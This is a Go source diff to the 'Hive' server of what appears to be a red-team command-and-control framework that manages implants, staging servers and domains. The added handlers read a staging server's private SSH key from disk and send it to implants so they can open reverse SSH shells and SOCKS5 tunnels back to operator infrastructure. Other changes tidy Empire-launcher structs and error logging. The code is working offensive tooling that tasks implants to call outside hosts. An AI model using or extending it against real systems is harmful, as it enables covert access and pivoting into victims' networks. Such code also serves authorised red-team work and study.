@@ -21,6 +21,9 @@ import (
 
 
 
+/*
+Hive Related JSON Objects
+*/
 
 //The following structs defines JSON commands that will be de-serialized by Hive. They are originated crafted within electronGUI by Ops. 
 //JSON Objects created at: ./src/client/electronGUI/components/createforms/forms.js
@@ -46,19 +49,7 @@ type Red struct{
     Domain string `json:"domain"`
 }
 
-//JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
-type InjectEmpire struct {
-    Staging string   `json:"staging"`
-}
 
-//JSON Objects created at: ./src/client/electronGUI/components/implant/implant.js
-type DropImplant struct {
-	Implant string   `json:"implant"`
-    Staging string   `json:"staging"`
-    Os string   `json:"os"`
-    Arch string   `json:"arch"`
-    Filename string   `json:"filename"`
-}
 
 //Deletes
 type DeleteImplant struct{
@@ -108,6 +99,42 @@ type InjectRevSshShellBichito struct {
     Sshkey string   `json:"sshkey"`
     Port string   `json:"port"`
     User string   `json:"user"`
+}
+
+
+/*
+//Used to send detailed information to Bichito for an Reverse SSH Interaction.
+//Same mappings: ./src/bichito/modules/biterpreter/inject_rev_sshSOCKS5_trio.go
+type InjectRevSshSocks5Bichito struct {
+    Domain string   `json:"domain"`
+    Sshkey string   `json:"sshkey"`
+    Port string   `json:"port"`
+    User string   `json:"user"`
+    Socks5Port string   `json:"socks5port"` //This is the SOCKS5 port that will be opened in the implant device
+}
+*/
+
+//This Struct for all default staging server creation that doesn't require more inputs that just staging name
+//JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
+type InjectDefaultStaging struct {
+    Staging string   `json:"staging"`
+}
+
+/*
+//JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
+type InjectSocks5 struct {
+    Staging string   `json:"staging"`
+    Socks5Port string   `json:"socks5port"`
+}
+*/
+
+//JSON Objects created at: ./src/client/electronGUI/components/implant/implant.js
+type DropImplant struct {
+	Implant string   `json:"implant"`
+    Staging string   `json:"staging"`
+    Os string   `json:"os"`
+    Arch string   `json:"arch"`
+    Filename string   `json:"filename"`
 }
 
 
@@ -272,7 +299,7 @@ func jobProcessor(jobO *Job,queue bool){
 			These Hive to process commands have a common pattern:
 			A. Their objective: Create or delete Resources (Implants,VPS,Stagings,Operators...)
 			B. Decode the Json-Job Body towards the right Command-Object. JSON is used here since there is a lot of inner parameters.
-			C. White-List every string decoded (Not escaping Persistence params yet)
+			C. input sanitation every string decoded (Not escaping Persistence params yet)
 			D. Forcreating resources, check if it exists, if not, start the creation/deletion routine
 			Note:
 				A lot of these commands have an extra error check to detect DB Lock problems. They will be removed in the future if 
@@ -302,7 +329,7 @@ func jobProcessor(jobO *Job,queue bool){
 					return
     			}
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !(namesInputWhite(commandO.Name) && numbersInputWhite(commandO.Ttl) && numbersInputWhite(commandO.Resptime) && 
     				 namesInputWhite(commandO.Coms)){
 
@@ -405,7 +432,14 @@ func jobProcessor(jobO *Job,queue bool){
 				errI := createImplant(commandO.Offline,commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
 				
 				if errI != ""{
-					removeImplant(commandO.Name)
+					
+					rmStatus := removeImplant(commandO.Name)
+					if (rmStatus != "Done"){
+						time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't remove correctly Erronious Implant "+rmStatus)
+					}
+					
+
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-createImplant("+errI+")")
 					if (jStatus != nil){
@@ -458,7 +492,7 @@ func jobProcessor(jobO *Job,queue bool){
 					return
     			}
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !namesInputWhite(commandO.Name){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-deleteImplant(Implant "+commandO.Name+" Incorrect Param. Formatting)")
@@ -677,7 +711,7 @@ func jobProcessor(jobO *Job,queue bool){
 					return
     			}
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !namesInputWhite(commandO.Name){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-deleteVPC(VPC "+commandO.Name+" Incorrect Param. Formatting)")
@@ -942,7 +976,7 @@ func jobProcessor(jobO *Job,queue bool){
 					return
     			}
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !namesInputWhite(commandO.Name){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-deleteDomain(Domain "+commandO.Name+" Incorrect Param. Formatting)")
@@ -1226,7 +1260,11 @@ func jobProcessor(jobO *Job,queue bool){
         				return
 					}
 					
-					removeStaging(commandO.Name)
+					resRemoveStg := removeStaging(commandO.Name)
+					if (resRemoveStg != "Done"){
+					    time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't remove Staging Correctly "+resRemoveStg)	
+					}
 					return
 				}else{
 					jStatus = setJobStatusDB(jid,"Success")
@@ -1270,7 +1308,7 @@ func jobProcessor(jobO *Job,queue bool){
     			}
 
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !namesInputWhite(commandO.Name){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-deleteStaging(Staging "+commandO.Name+" Incorrect Param. Formatting)")
@@ -1427,7 +1465,7 @@ func jobProcessor(jobO *Job,queue bool){
    	 				return
 				}
 				
-    			//Server Side white-list for Hive Commands
+    			//Server Side input sanitation for Hive Commands
     			if !(namesInputWhite(commandO.Implant) && namesInputWhite(commandO.Staging) && namesInputWhite(stagingO.DomainName) && 
     				namesInputWhite(droplet.Path) && namesInputWhite(commandO.Os) && namesInputWhite(commandO.Arch) && 
     				filesInputWhite(commandO.Filename)){
@@ -1501,7 +1539,7 @@ func jobProcessor(jobO *Job,queue bool){
 					return
    				}
 
-    			//Server Side white-list for Hive Commands
+    			//Server Side  for Hive Commands
     			if !namesInputWhite(commandO.Name){
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" Incorrect Param. Formatting)")
@@ -1960,6 +1998,9 @@ func jobProcessor(jobO *Job,queue bool){
 
 			
 			//Staging/POST Actions
+			//	These actions required of a tampering on the Job towards and implant, since they heavily realied in existing Infrastructure to work 
+			//	(Infra. managed by STime)
+
 
 			/* Generate an Empire launcher using Job data
 				A.Decode Job
@@ -1970,7 +2011,7 @@ func jobProcessor(jobO *Job,queue bool){
 
 				//Get staging
 				//from staging: type,port,domain
-    			jsconcommanA := make([]InjectEmpire, 0)
+    			jsconcommanA := make([]InjectDefaultStaging, 0)
     			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
     			errD := decoder.Decode(&jsconcommanA)
     			commandO := jsconcommanA[0]
@@ -2033,24 +2074,24 @@ func jobProcessor(jobO *Job,queue bool){
 				return
 
 
-			/* Generate an Empire launcher using Job data
-				A.Decode Job
+			/* Prepare a Job to be processed by the bichitos, with the objective of opening a full interactive session with a certain staging Server
+				A.Decode Job, and input sanitation inputs
 				B.Get the Domain for the target staging
 				C.Read target staging server pem key
-				D.Encode the em key and the user of the rev. ssh within a Job to be sent back to the Bichito
+				D.Encode the pem key and the user of the rev. ssh within a Job to be sent back to the Bichito
 			*/
 			case "injectRevSshShell":
 
 				//Get staging
 				//from staging: type,port,domain
-    			jsconcommanA := make([]InjectEmpire, 0)
+    			jsconcommanA := make([]InjectDefaultStaging, 0)
     			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
     			errD := decoder.Decode(&jsconcommanA)
     			commandO := jsconcommanA[0]
     			// Error Log
     			if errD != nil {
 					jStatus = setJobStatusDB(jid,"Error")
-					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
+					jResult = setJobResultDB(jid,"Implant-injectRevSSHShell(Command JSON Decoding Error)")
 					if (jStatus != nil){
         				time := time.Now().Format("02/01/2006 15:04:05 MST")
         				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
@@ -2135,6 +2176,7 @@ func jobProcessor(jobO *Job,queue bool){
 				jobsToProcess.mux.Unlock()
 				return
 
+			//Offline Version of rev. ssh, without retrieving DB data from "created Infrastructure" 
 			case "injectRevSshShellOffline":
 
 				//Get staging
@@ -2146,7 +2188,7 @@ func jobProcessor(jobO *Job,queue bool){
     			// Error Log
     			if errD != nil {
 					jStatus = setJobStatusDB(jid,"Error")
-					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Command JSON Decoding Error)")
 					if (jStatus != nil){
         				time := time.Now().Format("02/01/2006 15:04:05 MST")
         				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
@@ -2244,6 +2286,220 @@ func jobProcessor(jobO *Job,queue bool){
     			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				jobsToProcess.mux.Unlock()
 				return
+
+
+			/* Prepare a Job to be processed by the bichitos, with the objective of opening a SOCKS5 socket with a certain staging Server
+				A.Decode Job, and input sanitation inputs
+				B.Get the Domain for the target staging
+				C.Read target staging server pem key
+				D.Encode the pem key and the user of the rev. ssh within a Job to be sent back to the Bichito
+			*/
+			case "injectRevSshSocks5":
+
+				//Get staging
+				//from staging: type,port,domain
+    			jsconcommanA := make([]InjectDefaultStaging, 0)
+    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+    			errD := decoder.Decode(&jsconcommanA)
+    			commandO := jsconcommanA[0]
+    			// Error Log
+    			if errD != nil {
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshSocks5(Command JSON Decoding Error)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					return
+    			}
+
+    			if !namesInputWhite(commandO.Staging){
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Hive-injectRevSshShell(Staging "+commandO.Staging+" Incorrect Param. Formatting)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					
+					return
+    			}
+
+    			domain,err1,err2 := getDomainbyStagingDB(commandO.Staging)
+    			if (err1 != nil) || (err2 != nil) {
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectSOCKS5(Get Staging Domain):"+err1.Error()+err2.Error())
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					return
+    			}
+
+
+    			///usr/local/STHive/stagings/%s/implantkey
+
+    			sshkey, err := ioutil.ReadFile("/usr/local/STHive/stagings/"+commandO.Staging+"/implantkey")
+    			if err != nil {
+        			//ErrorLog
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectSOCKS5(Reading Anonymous Staging Key):"+err1.Error()+err2.Error())
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+        			return
+    			}
+
+    			//JSON Encode function params 
+    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey),"22","anonymous"}
+				bufBP := new(bytes.Buffer)
+				json.NewEncoder(bufBP).Encode(revssshellhparams)
+				resultBP := bufBP.String()
+
+				jobO.Parameters = resultBP
+				
+
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
+			//Offline Version of rev. ssh, without retrieving DB data from "created Infrastructure" 
+			case "injectRevSshSocks5Offline":
+
+				//Get staging
+				//from staging: type,port,domain
+    			jsconcommanA := make([]InjectRevSshShellBichito, 0)
+    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+    			errD := decoder.Decode(&jsconcommanA)
+    			commandO := jsconcommanA[0]
+    			// Error Log
+    			if errD != nil {
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Command JSON Decoding Error)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					return
+    			}
+
+    			//WhiteList Client params
+
+    			if !domainsInputWhite(commandO.Domain){
+        			//ErrorLog
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+        			return
+    			}
+
+    			if !rsaKeysInputWhite(commandO.Sshkey){
+        			//ErrorLog
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+        			return
+    			}
+
+    			if !tcpPortInputWhite(commandO.Port){
+        			//ErrorLog
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+        			return
+    			}
+
+    			if !namesInputWhite(commandO.User){
+        			//ErrorLog
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+        			return
+    			}
+
+    			//JSON Encode function params 
+    			revssshellhparams := InjectRevSshShellBichito{commandO.Domain,commandO.Sshkey,commandO.Port,commandO.User}
+				bufBP := new(bytes.Buffer)
+				json.NewEncoder(bufBP).Encode(revssshellhparams)
+				resultBP := bufBP.String()
+
+				jobO.Parameters = resultBP
+				jobO.Job = "injectRevSshSocks5"
+
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
 
 			//SYSTEM Jobs
 			//[...]
@@ -2664,24 +2920,40 @@ D.Remove staging from DB
 */
 func removeStaging(stagingName string) string{
 
+	var errorBuffer string
+
 	//Remove infra, if sucessful, remove DB row
 	resRemove := destroyStagingInfra(stagingName)
 	if resRemove != "Done"{
-		return resRemove
+		errorBuffer = "-- Error on Destroying Staging Infrastructure: "+resRemove
+		return errorBuffer
 	}
+
+	var removeStagingFolderErr bytes.Buffer
+
 	mkdir := exec.Command("/bin/sh","-c","rm -r /usr/local/STHive/stagings/"+stagingName)
+	mkdir.Stderr = &removeStagingFolderErr
 	mkdir.Start()
 	mkdir.Wait()
-	dname,_,_ := getDomainNbyStagingNameDB(stagingName)
 	
+	if (removeStagingFolderErr.String() != ""){
+		errorBuffer = errorBuffer+"-- Error removing Staging folder: "+removeStagingFolderErr.String()
+	}
+
+	dname,_,_ := getDomainNbyStagingNameDB(stagingName)
 	errSet1 := setUsedDomainDB(dname,"No")
 	errSet2 := rmStagingDB(stagingName)
-	if (errSet1 != nil) || (errSet2 != nil) {
-		return errSet1.Error()
+	if (errSet1 != nil){
+		errorBuffer = errorBuffer+"-- Error changing Staging Domain status: "+errSet1.Error()
 	}
 
 	if (errSet2 != nil) {
-		return errSet2.Error()
+		errorBuffer = errorBuffer+"-- Error removing Staging from DB: "+errSet2.Error()
+	}
+
+	//Decide if remove the Staging was or not without errors and return
+	if (errorBuffer != ""){
+		return errorBuffer
 	}
 
 	return "Done"
